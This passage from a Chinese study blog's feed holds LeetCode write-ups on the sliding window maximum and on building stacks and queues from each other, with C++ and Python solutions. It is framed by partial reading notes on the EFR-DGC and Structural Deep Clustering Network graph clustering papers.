中的性能变化。实验结果表明，当 ε = 1.0  时，我们的模型达到最佳性能。同时，我们的模型是稳健的，因为它不会随着参数值的变化而发生剧烈变化</code></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303232103505.png" alt="image-20230323210335444"></p><blockquote><ol start="3"><li>可视化特征表示</li></ol></blockquote><p>如图 6 所示，<code>**第一行对应于原始社区数据的分布，第二行对应于基本自动编码器的表示分布，最后一行对应于我们的 EFR-DGC 的表示分布</code>。正如我们所见，<code>单个 AE 或 GAE 生成的特征表示无法有效分离</code>。相反，我<code>们的方法可以减少不同社区的重叠，并使同一社区内的节点彼此封闭。</code>特别是，<code>与 GAE 模型（在我们的基线方法 DAEGC 中使用）相比，我们的模型增强了属性信息表示，从而提高了社区节点的可区分性</code>。</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303232106588.png" alt="image-20230323210654535"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> 深度聚类 </tag>
            
            <tag> 图深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>滑动窗口最大值</title>
      <link href="/2023/03/19/239.%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E6%9C%80%E5%A4%A7%E5%80%BC/"/>
      <url>/2023/03/19/239.%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E6%9C%80%E5%A4%A7%E5%80%BC/</url>
      
        <content type="html"><![CDATA[<h1 id="239-滑动窗口最大值"><a href="#239-滑动窗口最大值" class="headerlink" title="239. 滑动窗口最大值"></a><a href="https://leetcode.cn/problems/sliding-window-maximum/">239. 滑动窗口最大值</a></h1><h2 id="先验知识-deque"><a href="#先验知识-deque" class="headerlink" title="先验知识 deque"></a>先验知识 deque</h2><pre class=" language-c++"><code class="language-c++">c++ 中双向队列deque<int> q; //创建一个空队列int a;q.push_back(a); //将a元素放入q的最末端q.push_front(a); //将a元素放入q的最前端q.pop_back(); //弹出最后一个元素q.pop_front(); //弹出首元素q.back(); //获取最后一个元素的值q.front(); //获取首元素的值作者：NY2025xieyc链接：https://leetcode.cn/problems/sliding-window-maximum/solution/chua-dong-chuang-kou-zui-da-zhi-dan-diao-ao5i/来源：力扣（LeetCode）著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</code></pre><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><pre class=" language-python"><code class="language-python">给你一个整数数组 nums，有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 k 个数字。滑动窗口每次只向右移动一位。返回 滑动窗口中的最大值 。来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>sliding<span class="token operator">-</span>window<span class="token operator">-</span>maximum著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class=" language-python"><code class="language-python">输入：nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">3</span>输出：<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span>解释：滑动窗口的位置                最大值<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>               <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">1</span>  <span class="token number">3</span>  <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token number">3</span>  <span class="token number">5</span>  <span class="token number">3</span>  <span class="token number">6</span>  <span class="token number">7</span>       <span class="token number">3</span> <span class="token number">1</span> <span class="token punctuation">[</span><span class="token number">3</span>  <span class="token operator">-</span><span class="token number">1</span>  <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token number">5</span>  <span class="token number">3</span>  <span class="token number">6</span>  <span class="token number">7</span>       <span class="token number">3</span> <span class="token number">1</span>  <span class="token number">3</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span>  <span class="token operator">-</span><span class="token number">3</span>  <span class="token number">5</span><span class="token punctuation">]</span> <span class="token number">3</span>  <span class="token number">6</span>  <span class="token number">7</span>       <span class="token number">5</span> <span class="token number">1</span>  <span class="token number">3</span>  <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span>  <span class="token number">5</span>  <span class="token number">3</span><span class="token punctuation">]</span> <span class="token number">6</span>  <span class="token number">7</span>       <span class="token number">5</span> <span class="token number">1</span>  <span class="token number">3</span>  <span class="token operator">-</span><span class="token number">1</span>  <span class="token operator">-</span><span class="token number">3</span> <span class="token punctuation">[</span><span class="token number">5</span>  <span class="token number">3</span>  <span class="token number">6</span><span class="token punctuation">]</span> <span class="token number">7</span>       <span class="token number">6</span> <span class="token number">1</span>  <span class="token number">3</span>  <span class="token operator">-</span><span class="token number">1</span>  <span class="token operator">-</span><span class="token number">3</span>  <span class="token number">5</span> <span class="token punctuation">[</span><span class="token number">3</span>  <span class="token number">6</span>  <span class="token number">7</span><span class="token punctuation">]</span>      <span class="token number">7</span>来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>sliding<span class="token operator">-</span>window<span class="token operator">-</span>maximum著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="题目解法"><a href="#题目解法" class="headerlink" title="题目解法"></a>题目解法</h2><h3 id="1-算法思路"><a href="#1-算法思路" class="headerlink" title="1. 算法思路"></a>1. 算法思路</h3><p>单调队列实现</p><h3 id="2-实现"><a href="#2-实现" class="headerlink" title="2. 实现"></a>2. 实现</h3><blockquote><p> c++ 一</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;private:    class MyQueue &#123; //单调队列（从大到小）    public:        deque<int> que; // 使用deque来实现单调队列        // 每次弹出的时候，比较当前要弹出的数值是否等于队列出口元素的数值，如果相等则弹出。        // 同时pop之前判断队列当前是否为空。        void pop(int value) &#123;            if (!que.empty() && value == que.front()) &#123;                que.pop_front();            &#125;        &#125;        // 如果push的数值大于入口元素的数值，那么就将队列后端的数值弹出，直到push的数值小于等于队列入口元素的数值为止。        // 这样就保持了队列里的数值是单调从大到小的了。        void push(int value) &#123;            while (!que.empty() && value > que.back()) &#123;                que.pop_back();            &#125;            que.push_back(value);        &#125;        // 查询当前队列里的最大值 直接返回队列前端也就是front就可以了。        int front() &#123;            return que.front();        &#125;    &#125;;public:    vector<int> maxSlidingWindow(vector<int>& nums, int k) &#123;        MyQueue que;        vector<int> result;        for (int i = 0; i < k; i++) &#123; // 先将前k的元素放进队列            que.push(nums[i]);        &#125;        result.push_back(que.front()); // result 记录前k的元素的最大值        for (int i = k; i < nums.size(); i++) &#123;            que.pop(nums[i - k]); // 滑动窗口移除最前面元素            que.push(nums[i]); // 滑动窗口前加入最后面的元素            result.push_back(que.front()); // 记录对应的最大值        &#125;        return result;    &#125;&#125;;</code></pre><blockquote><p> c++ 二</p></blockquote><pre class=" language-c++"><code class="language-c++">//对c++ 一class Solution &#123;public:    vector<int> maxSlidingWindow(vector<int>& nums, int k) &#123;        vector<int> result;        deque<int> que;//双端队列 维护最大的单调队列        if(nums.size()<2)            return nums;// 数组为空 或者只有一个 返回原数组                for( int  i=0;i<nums.size();i++)&#123;            //1. 双端队列维护的单调队列 添加元素            while(!que.empty() &&   que.back()<nums[i])//判断当前                que.pop_back();//            que.push_back(nums[i]);            //2. 删除单调队列的元素            if(i>=k && nums[i-k]==que.front())                que.pop_front();            //3. 添加滑动窗口中的最大值            if(i>=k-1)                result.push_back(que.front());        &#125;        return result;           &#125;&#125;;</code></pre><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><pre class=" language-python"><code class="language-python">时间复杂度：O<span class="token punctuation">(</span>n<span class="token punctuation">)</span>，其中 n 是数组 nums 的长度。每一个下标恰好被放入队列一次，并且最多被弹出队列一次，因此时间复杂度为 O<span class="token punctuation">(</span>n<span class="token punctuation">)</span>。空间复杂度：O<span class="token punctuation">(</span>k<span class="token punctuation">)</span>。与方法一不同的是，在方法二中我们使用的数据结构是双向的，因此「不断从队首弹出元素」保证了队列中最多不会有超过 k<span class="token operator">+</span><span class="token number">1</span> 个元素，因此队列使用的空间为 O<span class="token punctuation">(</span>k<span class="token punctuation">)</span>。作者：LeetCode<span class="token operator">-</span>Solution链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>sliding<span class="token operator">-</span>window<span class="token operator">-</span>maximum<span class="token operator">/</span>solution<span class="token operator">/</span>hua<span class="token operator">-</span>dong<span class="token operator">-</span>chuang<span class="token operator">-</span>kou<span class="token operator">-</span>zui<span class="token operator">-</span>da<span class="token operator">-</span>zhi<span class="token operator">-</span>by<span class="token operator">-</span>leetco<span class="token operator">-</span>ki6m<span class="token operator">/</span>来源：力扣（LeetCode）著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://programmercarl.com/0239.%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E6%9C%80%E5%A4%A7%E5%80%BC.html">代码随想录 (programmercarl.com)</a></p><p><a href="https://leetcode.cn/problems/sliding-window-maximum/solution/shuang-xiang-dui-lie-jie-jue-hua-dong-chuang-kou-2/">双向队列解决滑动窗口最大值 - 滑动窗口最大值 - 力扣（LeetCode）</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI0NjAxMDU5NA==&mid=2475920459&idx=1&sn=3f7a5d2c9d01d2d0b7e7aba0cf3140d7&chksm=ff22ebc6c85562d0726fbfeccf6e987b4d5b379e50942c981e7075a710eca10af38806833047&scene=178&cur_album_id=1961651953529159689#rd">队列，帮我搞一下这个滑动窗口最大值。 (qq.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 队列和栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用队列实现栈</title>
      <link href="/2023/03/19/235.%E7%94%A8%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0%E6%A0%88/"/>
      <url>/2023/03/19/235.%E7%94%A8%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<h1 id="225-用队列实现栈"><a href="#225-用队列实现栈" class="headerlink" title="225. 用队列实现栈"></a><a href="https://leetcode.cn/problems/implement-stack-using-queues/">225. 用队列实现栈</a></h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre class=" language-c++"><code class="language-c++">请你仅使用两个队列实现一个后入先出（LIFO）的栈，并支持普通栈的全部四种操作（push、top、pop 和 empty）。实现 MyStack 类：void push(int x) 将元素 x 压入栈顶。int pop() 移除并返回栈顶元素。int top() 返回栈顶元素。boolean empty() 如果栈是空的，返回 true ；否则，返回 false 。 注意：你只能使用队列的基本操作 —— 也就是 push to back、peek/pop from front、size 和 is empty 这些操作。你所使用的语言也许不支持队列。 你可以使用 list （列表）或者 deque（双端队列）来模拟一个队列 , 只要是标准的队列操作即可。来源：力扣（LeetCode）链接：https://leetcode.cn/problems/implement-stack-using-queues著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="先验知识"><a href="#先验知识" class="headerlink" title="先验知识"></a>先验知识</h2><pre class=" language-c++"><code class="language-c++">que.back();  返回最后一个元素que.empty();  如果队列空则返回真que.front();  返回第一个元素que.pop();  删除第一个元素que.push();  在末尾加入一个元素https://blog.csdn.net/weixin_42513339/article/details/89054438</code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class=" language-c++"><code class="language-c++">输入：["MyStack", "push", "push", "top", "pop", "empty"][[], [1], [2], [], [], []]输出：[null, null, null, 2, 2, false]解释：MyStack myStack = new MyStack();myStack.push(1);myStack.push(2);myStack.top(); // 返回 2myStack.pop(); // 返回 2myStack.empty(); // 返回 False来源：力扣（LeetCode）链接：https://leetcode.cn/problems/implement-stack-using-queues著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="解题思想"><a href="#解题思想" class="headerlink" title="解题思想"></a>解题思想</h2><h3 id="1-思路-双队列"><a href="#1-思路-双队列" class="headerlink" title="1. 思路  双队列"></a>1. 思路  双队列</h3><ol><li><p>一个队列为主队列，一个为辅助队列</p></li><li><p>当入栈操作时，我们先将主队列内容导入辅助队列，然后将入栈元素放入主队列队头位置，再将辅助队列内容，依次添加进主队列即可。</p></li></ol><p>也可以用单队列实现</p><h3 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2.代码实现"></a>2.代码实现</h3><blockquote><p>c++</p></blockquote><pre class=" language-c++"><code class="language-c++">class MyStack &#123;public:    queue<int> que;    /** Initialize your data structure here. */    MyStack() &#123;    &#125;    /** Push element x onto stack. */    void push(int x) &#123;        que.push(x);    &#125;    /** Removes the element on top of the stack and returns that element. */    int pop() &#123;        int size = que.size();        size--;        while (size--) &#123; // 将队列头部的元素（除了最后一个元素外） 重新添加到队列尾部            que.push(que.front());            que.pop();        &#125;        int result = que.front(); // 此时弹出的元素顺序就是栈的顺序了        que.pop();        return result;    &#125;    /** Get the top element. */    int top() &#123;        return que.back();    &#125;    /** Returns whether the stack is empty. */    bool empty() &#123;        return que.empty();    &#125;&#125;;</code></pre><blockquote><p>python</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MyStack</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>queue<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">push</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">:</span> int<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None<span class="token punctuation">:</span>        self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">pop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> int<span class="token punctuation">:</span>        size<span class="token operator">=</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>queue<span class="token punctuation">)</span>        size<span class="token operator">=</span>size<span class="token number">-1</span>        <span class="token keyword">while</span> size<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            size<span class="token operator">=</span>size<span class="token number">-1</span>        result<span class="token operator">=</span>self<span class="token punctuation">.</span>queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">top</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> int<span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>queue<span class="token punctuation">[</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>queue<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">empty</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> bool<span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>queue<span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># Your MyStack object will be instantiated and called as such:</span><span class="token comment" spellcheck="true"># obj = MyStack()</span><span class="token comment" spellcheck="true"># obj.push(x)</span><span class="token comment" spellcheck="true"># param_2 = obj.pop()</span><span class="token comment" spellcheck="true"># param_3 = obj.top()</span><span class="token comment" spellcheck="true"># param_4 = obj.empty()</span></code></pre><blockquote><p>复杂度分析</p></blockquote><pre class=" language-python"><code class="language-python">时间复杂度：入栈操作 O<span class="token punctuation">(</span>n<span class="token punctuation">)</span>，其余操作都是 O<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>，其中 n 是栈内的元素个数。入栈操作需要将队列中的 n 个元素出队，并入队 n<span class="token operator">+</span><span class="token number">1</span> 个元素到队列，共有 2n<span class="token operator">+</span><span class="token number">1</span> 次操作，每次出队和入队操作的时间复杂度都是 O<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>，因此入栈操作的时间复杂度是 O<span class="token punctuation">(</span>n<span class="token punctuation">)</span>。出栈操作对应将队列的前端元素出队，时间复杂度是 O<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>。获得栈顶元素操作对应获得队列的前端元素，时间复杂度是 O<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>。判断栈是否为空操作只需要判断队列是否为空，时间复杂度是 O<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>。空间复杂度：O<span class="token punctuation">(</span>n<span class="token punctuation">)</span>，其中 n 是栈内的元素个数。需要使用一个队列存储栈内的元素。</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://leetcode.cn/problems/implement-stack-using-queues/solution/yong-dui-lie-shi-xian-zhan-by-leetcode-solution/">https://leetcode.cn/problems/implement-stack-using-queues/solution/yong-dui-lie-shi-xian-zhan-by-leetcode-solution/</a><br><a href="https://programmercarl.com/0225.%E7%94%A8%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0%E6%A0%88.html">代码随想录 (programmercarl.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 队列和栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用栈实现队列</title>
      <link href="/2023/03/19/232.%E7%94%A8%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/"/>
      <url>/2023/03/19/232.%E7%94%A8%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="232-用栈实现队列"><a href="#232-用栈实现队列" class="headerlink" title="232. 用栈实现队列"></a><a href="https://leetcode.cn/problems/implement-queue-using-stacks/">232. 用栈实现队列</a></h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><pre class=" language-c++"><code class="language-c++">请你仅使用两个栈实现先入先出队列。队列应当支持一般队列支持的所有操作（push、pop、peek、empty）：实现 MyQueue 类：void push(int x) 将元素 x 推到队列的末尾int pop() 从队列的开头移除并返回元素int peek() 返回队列开头的元素boolean empty() 如果队列为空，返回 true ；否则，返回 false说明：你 只能 使用标准的栈操作 —— 也就是只有 push to top, peek/pop from top, size, 和 is empty 操作是合法的。你所使用的语言也许不支持栈。你可以使用 list 或者 deque（双端队列）来模拟一个栈，只要是标准的栈操作即可。来源：力扣（LeetCode）链接：https://leetcode.cn/problems/implement-queue-using-stacks著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class=" language-c++"><code class="language-c++">输入：["MyQueue", "push", "push", "peek", "pop", "empty"][[], [1], [2], [], [], []]输出：[null, null, null, 1, 1, false]解释：MyQueue myQueue = new MyQueue();myQueue.push(1); // queue is: [1]myQueue.push(2); // queue is: [1, 2] (leftmost is front of the queue)myQueue.peek(); // return 1myQueue.pop(); // return 1, queue is [2]myQueue.empty(); // return false来源：力扣（LeetCode）链接：https://leetcode.cn/problems/implement-queue-using-stacks著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="题目解法"><a href="#题目解法" class="headerlink" title="题目解法"></a>题目解法</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>队列的特性是 ：<strong>先入先出</strong>，而栈的特性是 ：<strong>先入后出</strong>。</p><p>知道两者特性之后，我们需要用<strong>两个栈来模拟队列的特</strong>性，<strong>一个栈为入队栈</strong>，<strong>一个栈为出对栈</strong>。</p><ol><li><p>当<strong>出队栈存在内容时</strong>，<strong>出队栈的栈顶，即为第一个出队的元素</strong>。</p></li><li><p>若出队栈无元素，我们的需求又是出队的话，我们就需要将<strong>入队栈的内容反序导入出队栈</strong>，然后<strong>弹出栈顶即可</strong>。</p></li></ol><h3 id="不同语言实现"><a href="#不同语言实现" class="headerlink" title="不同语言实现"></a>不同语言实现</h3><blockquote><p> c++</p></blockquote><pre class=" language-c++"><code class="language-c++">class MyQueue &#123;public:    stack<int> stIn;    stack<int> stOut;    /** Initialize your data structure here. */    MyQueue() &#123;    &#125;    /** Push element x to the back of queue. */    void push(int x) &#123;        stIn.push(x);    &#125;    /** Removes the element from in front of queue and returns that element. */    int pop() &#123;        // 只有当stOut为空的时候，再从stIn里导入数据（导入stIn全部数据）        if (stOut.empty()) &#123;            // 从stIn导入数据直到stIn为空            while(!stIn.empty()) &#123;                stOut.push(stIn.top());                stIn.pop();            &#125;        &#125;        int result = stOut.top();        stOut.pop();        return result;    &#125;    /** Get the front element. */    int peek() &#123;        int res = this->pop(); // 直接使用已有的pop函数        stOut.push(res); // 因为pop函数弹出了元素res，所以再添加回去        return res;    &#125;    /** Returns whether the queue is empty. */    bool empty() &#123;        return stIn.empty() && stOut.empty();    &#125;&#125;;</code></pre><p>时间复杂度为何是0(1):<a href="https://leetcode.cn/problems/implement-queue-using-stacks/solution/sha-shi-jun-tan-fu-za-du-ya-wo-de-suan-f-gb6d/">啥是「均摊复杂度」呀？我的算法击败 100%，是 O(1) 算法了吧？ - 用栈实现队列 - 力扣（LeetCode）</a></p><ul><li>时间复杂度：<code>pop()</code> 和 <code>peek()</code> 操作都是均摊 <em>O</em>(1)</li><li>空间复杂度：<em>O</em>(<em>n</em>)</li></ul><blockquote><p>python</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MyQueue</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        in主要负责push，out主要负责pop        """</span>        self<span class="token punctuation">.</span>stack_in <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>stack_out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">push</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">:</span> int<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        有新元素进来，就往in里面push        """</span>        self<span class="token punctuation">.</span>stack_in<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">pop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> int<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Removes the element from in front of queue and returns that element.        """</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> None                <span class="token keyword">if</span> self<span class="token punctuation">.</span>stack_out<span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>stack_out<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack_in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>stack_out<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack_in<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>stack_out<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">peek</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> int<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Get the front element.        """</span>        ans <span class="token operator">=</span> self<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>stack_out<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ans<span class="token punctuation">)</span>        <span class="token keyword">return</span> ans    <span class="token keyword">def</span> <span class="token function">empty</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> bool<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        只要in或者out有元素，说明队列不为空        """</span>        <span class="token keyword">return</span> <span class="token operator">not</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack_in <span class="token operator">or</span> self<span class="token punctuation">.</span>stack_out<span class="token punctuation">)</span></code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://programmercarl.com/0232.%E7%94%A8%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97.html#%E6%80%9D%E8%B7%AF">代码随想录 (programmercarl.com)</a></p><p><a href="https://leetcode.cn/problems/implement-queue-using-stacks/solution/sha-shi-jun-tan-fu-za-du-ya-wo-de-suan-f-gb6d/">啥是「均摊复杂度」呀？我的算法击败 100%，是 O(1) 算法了吧？ - 用栈实现队列 - 力扣（LeetCode）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 栈和队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Structural Deep Clustering Network</title>
      <link href="/2023/03/15/SCDN/"/>
      <url>/2023/03/15/SCDN/</url>
      
        <content type="html"><![CDATA[<h1 id="论文阅读02-Structural-Deep-Clustering-Network"><a href="#论文阅读02-Structural-Deep-Clustering-Network" class="headerlink" title="论文阅读02-Structural Deep Clustering Network"></a>论文阅读02-Structural Deep Clustering Network</h1><h2 id="模型创新点"><a href="#模型创新点" class="headerlink" title="模型创新点"></a>模型创新点</h2><ol><li><p>我们提出了一种用于<code>深度聚类的新型结构深度聚类网络 (SDCN)</code>。所提出的 SDCN 有效地将<code>自动编码器和 GCN 的优势</code>与<code>新颖的交付算子和双自监督模块结合在一起</code>。据我们所知，这是<code>第一次明确地将结构信息应用于深度聚类</code>。</p></li><li><p><code>我们对提出的 SDCN 进行了理论分析</code>，并<code>证明 GCN 为 DNN 表示提供了近似的二阶图正则化</code>，并且在 SDCN 中<code>学习的数据表示等同于具有不同阶结构信息的表示的总和</code>。基于我们的理论分析，<code>SDCN中GCN模块的过度平滑问题将得到有效缓解</code>。</p></li></ol><h2 id="深度聚类"><a href="#深度聚类" class="headerlink" title="深度聚类"></a>深度聚类</h2><h3 id="1-存在问题：这篇论文之前"><a href="#1-存在问题：这篇论文之前" class="headerlink" title="1. 存在问题：这篇论文之前"></a>1. 存在问题：这篇论文之前</h3><p>尽管深度聚类取得了成功，但他们通常**<code>关注数据本身的特征</code>**，因此在<code>学习表示时很少考虑数据的结构</code></p><h3 id="2-结构信息添加到深度聚类解决问题"><a href="#2-结构信息添加到深度聚类解决问题" class="headerlink" title="2. 结构信息添加到深度聚类解决问题"></a>2. 结构信息添加到深度聚类解决问题</h3><blockquote><ol><li>深度聚类需要考虑哪些结构信息？</li></ol></blockquote><p> 